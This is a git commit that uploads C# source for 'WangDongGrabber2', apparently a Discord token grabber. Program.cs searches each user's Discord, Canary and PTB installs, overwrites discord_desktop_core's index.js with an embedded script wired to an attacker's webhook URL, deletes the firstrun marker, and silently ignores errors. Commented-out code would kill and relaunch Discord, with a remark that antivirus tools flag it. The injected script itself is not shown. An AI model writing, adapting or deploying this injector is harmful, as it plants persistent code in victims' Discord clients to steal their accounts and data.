f1160227ec1e9ee174ec18acdfabebd057780ad8
the sewer pig <82240493+thousandyearhog@users.noreply.github.com>
2021-09-10 19:51:11 -0400

    Add files via upload

---
+++ WangDongGrabber2/Config.cs
@@ -0,0 +1,9 @@
+﻿namespace wang
+{
+    class Config
+    {
+        public static string your_hook = @"YOUR WEBHOOK URL";
+        // See Program.cs:33 for more info.
+        /*public static bool restartDiscord = true;*/
+    }
+}
---
+++ WangDongGrabber2/Program.cs
@@ -0,0 +1,49 @@
+﻿using System;
+using System.IO;
+using wang.Properties;
+
+namespace wang
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string[] builds = { "Discord", "DiscordCanary", "DiscordPTB" };
+            foreach (var c in builds)
+            {
+                try
+                {
+                    if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), c)))
+                    {
+                        foreach (var f in Directory.GetFiles(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), c), "*.js", SearchOption.AllDirectories))
+                        {
+                            if (f.EndsWith(@"discord_desktop_core\index.js"))
+                            {
+                                if (File.Exists(f.Replace("index.js", "firstrun")))
+                                {
+                                    File.Delete(f.Replace("index.js", "firstrun"));
+                                }
+                                var core = new FileInfo(f)
+                                {
+                                    IsReadOnly = false
+                                };
+                                File.WriteAllText(f, Resources._in.Replace("%hookUrl%", Config.your_hook));
+                            }
+                        }
+                    }
+                }
+                catch { continue; }
+            }
+            // AVs hate this, but enable it if you want.
+            /*try
+            {
+                if (Config.restartDiscord)
+                {
+                    System.Diagnostics.Process.GetProcessesByName("Discord")[System.Diagnostics.Process.GetProcessesByName("Discord").Length - 1].Kill();
+                    System.Diagnostics.Process.Start(Directory.GetFiles(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord"), "Discord.exe", SearchOption.AllDirectories)[Directory.GetFiles(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord"), "Discord.exe", SearchOption.AllDirectories).Length - 1]);
+                }
+            }
+            catch { }*/
+        }
+    }
+}
